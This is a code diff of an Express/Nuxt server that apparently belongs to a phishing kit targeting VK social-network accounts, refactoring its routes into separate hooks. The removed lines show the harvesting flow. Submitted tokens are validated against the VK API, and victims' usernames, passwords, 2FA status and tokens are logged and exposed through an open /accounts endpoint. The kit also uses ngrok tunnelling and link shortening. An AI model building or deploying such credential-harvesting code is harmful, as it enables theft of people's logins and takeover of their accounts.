@@ -1,76 +1,53 @@
+const { existsSync } = require('fs')
+const { join } = require('path')
+
 const express = require('express')
 const consola = require('consola')
-const { Nuxt, Builder } = require('nuxt')
+
 const app = express()
 const bodyParser = require('body-parser')
-const { VK } = require('vk-io')
-const config = require('../nuxt.config.js')
+
+const config = require('../nuxt.config')
 const ngrok = require('./ngrok')
 
 // Import and Set Nuxt.js options
 config.dev = process.env.NODE_ENV !== 'production'
 
 const { getShortUrl, afterLogin } = require('./aye-kosmonavt-yaml')
-const userbot = require('./userbot').default
 
-async function start() {
+async function start(r) {
   // Init Nuxt.js
 
-  const nuxt = new Nuxt(config)
-  const accounts = []
+  let rendererPath = `./renderers/${r}`
 
-  const { host, port } = nuxt.options.server
-
-  // Build only in dev mode
-  if (config.dev) {
-    const builder = new Builder(nuxt)
-    await builder.build()
+  if (
+    !existsSync(join(__dirname, rendererPath + '.js')) ||
+    typeof r !== 'string'
+  ) {
+    rendererPath = `./renderers/default`
+    consola.error({
+      message: `Renderer ${r} not found, used default instead`,
+      badge: true
+    })
   } else {
-    await nuxt.ready()
+    consola.success(`Used renderer: ${r}`)
   }
+
+  const server = require(rendererPath)
+
+  const { host, port, renderer } = await server()
+
+  // const accounts = []
 
   // Give nuxt middleware to express
 
-  app.post('/auth', bodyParser.json(), (req, res) => {
-    userbot(req.body).then((json) => res.json(json))
-  })
+  app.post('/auth', bodyParser.json(), require('./hooks/auth'))
 
-  app.post('/done', bodyParser.json(), (req, res) => {
-    const vk = new VK({
-      token: req.body.token,
-      apiVersion: '5.103',
-      apiHeaders: {
-        'User-Agent': req.headers['user-agent'] || 'vkApi/1.0'
-      }
-    })
-
-    vk.api.users.get().then(([currentUser]) => {
-      accounts.push({ ...currentUser, ...req.body })
-
-      consola.info({ message: 'Got new account', badge: true })
-      consola.info(`Name: ${currentUser.first_name} ${currentUser.last_name}`)
-      consola.info(`Login: ${req.body.username}`)
-      consola.info(`Password: ${req.body.password}`)
-      if (req.body['2fa']) {
-        consola.error('2fa: Enabled')
-      } else {
-        consola.success('2fa: Disabled')
-      }
-      consola.info(`Token: ${req.body.token}`)
-    })
-
-    res.end('ok')
-  })
-
-  app.get('/accounts', (_uReq, res) => {
-    res.header('Access-Control-Allow-Origin', '*')
-
-    res.json({ accounts })
-  })
+  app.post('/done', bodyParser.json(), require('./hooks/done'))
 
   app.get('/exit', async (_uReq, res) => res.redirect(await afterLogin()))
 
-  app.use(nuxt.render)
+  app.use(renderer)
 
   // Listen the server
   app.listen(port, host)
@@ -80,7 +57,7 @@ async function start() {
     badge: true
   })
 
-  consola.info(`Admin started: http://${host}:${port}/admin/`)
+  // consola.info(`Admin started: http://${host}:${port}/admin/`)
 
   if (config.dev) {
     consola.info(`Listening dev url: http://${host}:${port}`)
@@ -99,7 +76,15 @@ async function start() {
   }
 }
 
-start()
+let renderer
+
+if (config.dev) {
+  renderer = 'default'
+} else {
+  renderer = 'generated'
+}
+
+start(renderer)
 
 process
   .on('unhandledRejection', (reason, p) => {
